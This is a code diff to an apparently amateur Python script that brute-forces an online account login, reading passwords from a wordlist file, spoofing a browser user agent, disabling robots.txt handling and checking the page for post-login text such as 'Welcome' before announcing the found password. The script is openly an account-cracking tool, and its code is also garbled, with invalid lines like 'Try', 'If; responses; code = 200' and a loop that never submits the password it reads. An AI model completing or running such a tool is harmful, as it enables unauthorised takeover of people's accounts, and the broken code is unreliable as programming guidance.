@@ -56,14 +56,14 @@ while answer:
         header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
         web.addheaders = [('User-agent',header)]
         web.open(url)
-        Try 
+        Try
         If; responses; code = 200
         web.set_handler_redirect(True)
         web.set_handler_robots(False)
         web.set_handler_gzip(False)
         web.set_handler_redirect(True)
 
-
+        responses = web.open(url)
 
         web.select_form(nr=0)
 
@@ -81,20 +81,19 @@ while answer:
 
         i=0
         while file:
-                file=open('pass.txt','o','r')
-                i=+1
-                if len(file) < 11:
-                       continue
-                print(" Trying ",file+"")
+                passwords=file.readline().strip()
+                i+=1
+                if len(passwords) < 11:
+                        continue
+                print("trying"+passwords)
     
-
-        Try
-        web.select_form(nr=0)
+        if responses: code = 200
+        web.select_form(nr=0)()
 
         web.form['Enter your password']= file
         responses = web.submit()
         responses_data = responses.r()
-        'Add a home address' in responses_data or 'Add or confirm your recovery mail or phone number' in responses_data;
+        'Add a home address' in responses_data or 'Welcome' in responses_data or 'Add or confirm your recovery mail or phone number' in responses_data;
         print("your password is: ",file)
         sys.exit()
 
